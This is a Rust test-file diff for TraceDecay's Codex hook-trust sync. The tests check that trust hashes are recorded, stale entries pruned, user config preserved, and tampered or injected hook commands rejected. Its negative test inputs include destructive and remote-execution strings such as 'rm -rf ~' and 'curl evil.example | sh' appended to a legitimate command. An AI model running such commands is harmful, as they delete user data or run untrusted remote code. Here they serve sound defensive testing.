@@ -272,9 +272,297 @@ trusted_hash = "sha256:stop"
     );
 }
 
-/// The install-output follow-up must stand until Codex itself records
-/// explicit, current trust for every managed hook — the one activation step
-/// TraceDecay cannot perform — and clear the moment it has.
+#[test]
+fn sync_codex_hook_trust_records_entries_and_preserves_unrelated_config() {
+    let home = tempfile::tempdir().expect("tempdir");
+    install_codex_personal_bootstrap(home.path(), TEST_BIN).unwrap();
+    let codex_dir = home.path().join(".codex");
+    std::fs::create_dir_all(&codex_dir).unwrap();
+    let config_path = codex_dir.join("config.toml");
+    // Seed unrelated user content plus a foreign plugin's trust entry.
+    std::fs::write(
+        &config_path,
+        r#"model = "o4-mini"
+
+[hooks.state."other@plugin:hooks/hooks.json:session_start:0:0"]
+trusted_hash = "sha256:foreign"
+"#,
+    )
+    .unwrap();
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt;
+        std::fs::set_permissions(&config_path, std::fs::Permissions::from_mode(0o600)).unwrap();
+    }
+
+    let outcome = sync_codex_hook_trust(home.path(), TEST_BIN).unwrap();
+    assert_eq!(outcome.trusted, CODEX_MANAGED_HOOKS.len());
+    assert!(outcome.skipped.is_empty());
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt;
+        assert_eq!(
+            std::fs::metadata(&config_path)
+                .unwrap()
+                .permissions()
+                .mode()
+                & 0o777,
+            0o600
+        );
+    }
+
+    let config_text = std::fs::read_to_string(&config_path).unwrap();
+    assert!(
+        config_text.lines().any(|line| line == "[hooks.state]"),
+        "Codex requires an explicit [hooks.state] parent table before trusting child records"
+    );
+
+    let entries = managed_entries(TEST_BIN);
+    let config = load_toml_file(&config_path).unwrap();
+    let state = config["hooks"]["state"].as_table().unwrap();
+    for entry in &entries {
+        assert_eq!(
+            state[&entry.trust_key]["trusted_hash"].as_str().unwrap(),
+            entry.hash,
+            "trust entry for {} not recorded exactly",
+            entry.event_label
+        );
+    }
+    // Unrelated content and the foreign entry survive.
+    assert_eq!(config["model"].as_str().unwrap(), "o4-mini");
+    assert_eq!(
+        state["other@plugin:hooks/hooks.json:session_start:0:0"]["trusted_hash"]
+            .as_str()
+            .unwrap(),
+        "sha256:foreign"
+    );
+    assert_eq!(
+        codex_plugin_hook_trust_state(&config, &entries),
+        CodexHookTrustState::Trusted
+    );
+
+    // Idempotent: a second sync leaves the same records (managed + 1 foreign).
+    let outcome2 = sync_codex_hook_trust(home.path(), TEST_BIN).unwrap();
+    assert_eq!(outcome2.trusted, CODEX_MANAGED_HOOKS.len());
+    let config2 = load_toml_file(&config_path).unwrap();
+    assert_eq!(
+        config2["hooks"]["state"].as_table().unwrap().len(),
+        CODEX_MANAGED_HOOKS.len() + 1
+    );
+}
+
+#[test]
+fn sync_codex_hook_trust_prunes_stale_and_preserves_foreign_entries() {
+    let home = tempfile::tempdir().expect("tempdir");
+    install_codex_personal_bootstrap(home.path(), TEST_BIN).unwrap();
+    let codex_dir = home.path().join(".codex");
+    std::fs::create_dir_all(&codex_dir).unwrap();
+    let config_path = codex_dir.join("config.toml");
+    // A leftover tracedecay-personal entry for a removed event, plus a foreign
+    // plugin entry that must be preserved.
+    std::fs::write(
+        &config_path,
+        r#"
+[hooks.state."tracedecay@personal:hooks/hooks.json:pre_tool_use:0:0"]
+trusted_hash = "sha256:stale"
+
+[hooks.state."other@plugin:hooks/hooks.json:session_start:0:0"]
+trusted_hash = "sha256:foreign"
+"#,
+    )
+    .unwrap();
+
+    sync_codex_hook_trust(home.path(), TEST_BIN).unwrap();
+
+    let config = load_toml_file(&config_path).unwrap();
+    let state = config["hooks"]["state"].as_table().unwrap();
+    assert!(
+        !state.contains_key("tracedecay@personal:hooks/hooks.json:pre_tool_use:0:0"),
+        "stale tracedecay-personal entry should be pruned"
+    );
+    assert_eq!(
+        state["other@plugin:hooks/hooks.json:session_start:0:0"]["trusted_hash"]
+            .as_str()
+            .unwrap(),
+        "sha256:foreign",
+        "foreign plugin entry must be preserved"
+    );
+    assert!(
+        state.contains_key("tracedecay@personal:hooks/hooks.json:session_start:0:0"),
+        "current managed events should be recorded"
+    );
+}
+
+#[test]
+fn sync_codex_hook_trust_uses_preserved_marketplace_identity() {
+    let home = tempfile::tempdir().expect("tempdir");
+    let marketplace_path = codex_personal_marketplace_path(home.path());
+    std::fs::create_dir_all(marketplace_path.parent().unwrap()).unwrap();
+    std::fs::write(
+        &marketplace_path,
+        r#"{
+  "name": "my-marketplace",
+  "interface": { "displayName": "My Marketplace" },
+  "plugins": []
+}"#,
+    )
+    .unwrap();
+    install_codex_personal_bootstrap(home.path(), TEST_BIN).unwrap();
+    std::fs::create_dir_all(home.path().join(".codex")).unwrap();
+
+    let outcome = sync_codex_hook_trust(home.path(), TEST_BIN).unwrap();
+    assert_eq!(outcome.trusted, CODEX_MANAGED_HOOKS.len());
+
+    let config = load_toml_file(&codex_config_path(home.path())).unwrap();
+    let state = config["hooks"]["state"].as_table().unwrap();
+    assert!(
+        state
+            .keys()
+            .all(|key| key.starts_with("tracedecay@my-marketplace:hooks/hooks.json:"))
+    );
+    assert!(
+        state
+            .keys()
+            .all(|key| !key.starts_with("tracedecay@personal:hooks/hooks.json:"))
+    );
+}
+
+#[test]
+fn sync_codex_hook_trust_hashes_the_installed_hook_payload() {
+    let home = tempfile::tempdir().expect("tempdir");
+    let plugin_dir = install_codex_personal_bootstrap(home.path(), TEST_BIN).unwrap();
+    let hooks_path = plugin_dir.join("hooks/hooks.json");
+    let mut hooks = load_json_file_strict(&hooks_path).unwrap();
+    hooks["hooks"]["SessionStart"][0]["hooks"][0]["timeout"] = json!(9);
+    safe_write_json_file(&hooks_path, &hooks, None).unwrap();
+    let changed_entries = codex_hook_trust_entries(&hooks).unwrap();
+    std::fs::create_dir_all(home.path().join(".codex")).unwrap();
+
+    sync_codex_hook_trust(home.path(), TEST_BIN).unwrap();
+
+    let config = load_toml_file(&codex_config_path(home.path())).unwrap();
+    assert_eq!(
+        codex_plugin_hook_trust_state(&config, &changed_entries),
+        CodexHookTrustState::Trusted,
+        "trust must cover the exact hook payload installed for Codex"
+    );
+}
+
+#[test]
+fn sync_codex_hook_trust_reads_a_custom_marketplace_cache() {
+    let home = tempfile::tempdir().expect("tempdir");
+    let marketplace_path = codex_personal_marketplace_path(home.path());
+    std::fs::create_dir_all(marketplace_path.parent().unwrap()).unwrap();
+    std::fs::write(
+        &marketplace_path,
+        r#"{
+  "name": "my-marketplace",
+  "interface": { "displayName": "My Marketplace" },
+  "plugins": [{"name": "tracedecay"}]
+}"#,
+    )
+    .unwrap();
+    let plugin_dir = home.path().join(format!(
+        ".codex/plugins/cache/my-marketplace/tracedecay/{}",
+        crate::PRODUCT_VERSION
+    ));
+    install_codex_plugin_bundle(&plugin_dir, TEST_BIN, InstallScope::Global, home.path()).unwrap();
+    let hooks_path = plugin_dir.join("hooks/hooks.json");
+    let mut hooks = load_json_file_strict(&hooks_path).unwrap();
+    hooks["hooks"]["SessionStart"][0]["hooks"][0]["timeout"] = json!(9);
+    safe_write_json_file(&hooks_path, &hooks, None).unwrap();
+    let changed_entries =
+        codex_hook_trust_entries_for_marketplace(&hooks, "my-marketplace").unwrap();
+    std::fs::create_dir_all(home.path().join(".codex")).unwrap();
+
+    sync_codex_hook_trust(home.path(), TEST_BIN).unwrap();
+
+    let config = load_toml_file(&codex_config_path(home.path())).unwrap();
+    assert_eq!(
+        codex_plugin_hook_trust_state(&config, &changed_entries),
+        CodexHookTrustState::Trusted
+    );
+}
+
+#[test]
+fn sync_codex_hook_trust_rejects_tampered_installed_command() {
+    let home = tempfile::tempdir().expect("tempdir");
+    let plugin_dir = install_codex_personal_bootstrap(home.path(), TEST_BIN).unwrap();
+    let hooks_path = plugin_dir.join("hooks/hooks.json");
+    let mut hooks = load_json_file_strict(&hooks_path).unwrap();
+    let command = hooks["hooks"]["SessionStart"][0]["hooks"][0]["command"]
+        .as_str()
+        .unwrap()
+        .to_string();
+    hooks["hooks"]["SessionStart"][0]["hooks"][0]["command"] =
+        json!(format!("{command} && /tmp/untrusted-payload"));
+    safe_write_json_file(&hooks_path, &hooks, None).unwrap();
+    std::fs::create_dir_all(home.path().join(".codex")).unwrap();
+
+    let outcome = sync_codex_hook_trust(home.path(), TEST_BIN).unwrap();
+
+    assert_eq!(outcome.trusted, CODEX_MANAGED_HOOKS.len() - 1);
+    assert_eq!(outcome.skipped, vec!["session_start".to_string()]);
+    let config = load_toml_file(&codex_config_path(home.path())).unwrap();
+    let state = config["hooks"]["state"].as_table().unwrap();
+    assert!(!state.keys().any(|key| key.ends_with(":session_start:0:0")));
+}
+
+#[test]
+fn codex_hook_command_invokes_tracedecay_is_a_safety_valve() {
+    // A hook that actually invokes the tracedecay binary is trustable. Build
+    // the command through the same hook_command helper the generator uses so
+    // the assertion holds under each platform's quoting (single quotes on
+    // Unix, different quoting on Windows).
+    assert!(codex_hook_command_invokes_tracedecay(
+        &crate::agents::hook_command(TEST_BIN, "hook-codex-session-start"),
+        TEST_BIN
+    ));
+    // Every managed subcommand's exact generated command is trustable.
+    for hook in CODEX_MANAGED_HOOKS {
+        assert!(
+            codex_hook_command_invokes_tracedecay(
+                &crate::agents::hook_command(TEST_BIN, hook.subcommand),
+                TEST_BIN
+            ),
+            "generated command for {} should be trusted",
+            hook.subcommand
+        );
+    }
+    // A hook that does not invoke the tracedecay binary is never auto-trusted.
+    assert!(!codex_hook_command_invokes_tracedecay(
+        "/usr/bin/rm -rf /",
+        TEST_BIN
+    ));
+    assert!(!codex_hook_command_invokes_tracedecay(
+        &crate::agents::hook_command("/somewhere/else/tracedecay", "hook-codex-session-start"),
+        TEST_BIN
+    ));
+    // Suffix injection: a command that starts with our binary token but appends
+    // an arbitrary payload must be rejected (a prefix check would have trusted
+    // it). Also reject an unknown subcommand and a prefix-only fragment.
+    let base = crate::agents::hook_command(TEST_BIN, "hook-codex-session-start");
+    assert!(!codex_hook_command_invokes_tracedecay(
+        &format!("{base} && rm -rf ~"),
+        TEST_BIN
+    ));
+    assert!(!codex_hook_command_invokes_tracedecay(
+        &format!("{base}; curl evil.example | sh"),
+        TEST_BIN
+    ));
+    assert!(!codex_hook_command_invokes_tracedecay(
+        &crate::agents::hook_command(TEST_BIN, "hook-codex-not-a-real-subcommand"),
+        TEST_BIN
+    ));
+    assert!(!codex_hook_command_invokes_tracedecay(
+        &crate::agents::hook_command(TEST_BIN, ""),
+        TEST_BIN
+    ));
+}
+
+/// The install-output follow-up must stand until explicit, current trust is
+/// recorded for every managed hook (normally by the auto-trust sync, or by
+/// `/hooks` when the safety valve skipped a hook) — and clear the moment it is.
 #[test]
 fn codex_hook_trust_followup_clears_only_after_explicit_current_trust() {
     let home = tempfile::tempdir().expect("tempdir");
@@ -769,10 +1057,84 @@ fn codex_preflight_reports_inactive_cache_without_interactive_guidance() {
 #[test]
 fn prepare_stages_the_source_and_returns_ready_for_cli_activation() {
     let home = tempfile::tempdir().unwrap();
+    // Pre-existing user config the install-path trust write must preserve.
+    let config_path = codex_config_path(home.path());
+    std::fs::create_dir_all(config_path.parent().unwrap()).unwrap();
+    std::fs::write(&config_path, "model = \"gpt-5\"\n").unwrap();
+
     let outcome = CodexIntegration
         .prepare_non_interactive_install(&install_ctx(home.path()))
         .unwrap();
     assert!(matches!(outcome, NonInteractiveInstallOutcome::Ready));
     assert!(codex_plugin_manifest_path(home.path()).is_file());
     assert!(codex_personal_marketplace_path(home.path()).is_file());
+
+    // Install auto-trusts the staged managed hooks in config.toml while
+    // leaving the user's unrelated keys intact.
+    let config = load_toml_file(&config_path).unwrap();
+    assert_eq!(config["model"].as_str().unwrap(), "gpt-5");
+    assert!(
+        config["hooks"]["state"]
+            .as_table()
+            .unwrap()
+            .keys()
+            .any(|key| key.starts_with("tracedecay@personal:hooks/hooks.json:")),
+        "install should record tracedecay hook trust entries"
+    );
+    assert!(
+        std::fs::read_to_string(&config_path)
+            .unwrap()
+            .lines()
+            .any(|line| line == "[hooks.state]"),
+        "install should write the explicit [hooks.state] parent table"
+    );
+}
+
+#[test]
+fn codex_update_plugin_refreshes_bundle_and_records_hook_trust() {
+    let home = tempfile::tempdir().unwrap();
+    write_exact_native_activation(home.path(), TEST_BIN);
+    // Re-seed config.toml with the native activation record plus an unrelated
+    // user key the trust write must preserve.
+    let config_path = codex_config_path(home.path());
+    std::fs::write(
+        &config_path,
+        "model = \"gpt-5\"\n\n[plugins.\"tracedecay@personal\"]\nenabled = true\n",
+    )
+    .unwrap();
+    let project_root = home.path().join("workspace");
+    let ctx = InstallContext {
+        project_root: Some(project_root),
+        ..install_ctx(home.path())
+    };
+
+    let outcome = CodexIntegration.update_plugin(&ctx).unwrap();
+    let UpdatePluginOutcome::Refreshed(paths) = outcome else {
+        panic!("expected codex update_plugin to refresh the bundle");
+    };
+    assert_eq!(paths, vec![codex_plugin_install_dir(home.path())]);
+
+    // update-plugin auto-trusts the refreshed hooks by recording their content
+    // hashes in config.toml, while leaving the user's unrelated keys intact.
+    let updated = load_toml_file(&config_path).unwrap();
+    assert_eq!(updated["model"].as_str().unwrap(), "gpt-5");
+    assert_eq!(
+        updated["plugins"]["tracedecay@personal"]["enabled"].as_bool(),
+        Some(true),
+        "update-plugin must preserve Codex's own activation record"
+    );
+    assert!(
+        updated["hooks"]["state"]
+            .as_table()
+            .unwrap()
+            .keys()
+            .any(|key| key.starts_with("tracedecay@personal:hooks/hooks.json:")),
+        "update-plugin should record tracedecay hook trust entries"
+    );
+    let entries = managed_entries(TEST_BIN);
+    assert_eq!(
+        codex_plugin_hook_trust_state(&updated, &entries),
+        CodexHookTrustState::Trusted
+    );
+    assert_eq!(codex_hook_trust_followup(home.path()), None);
 }
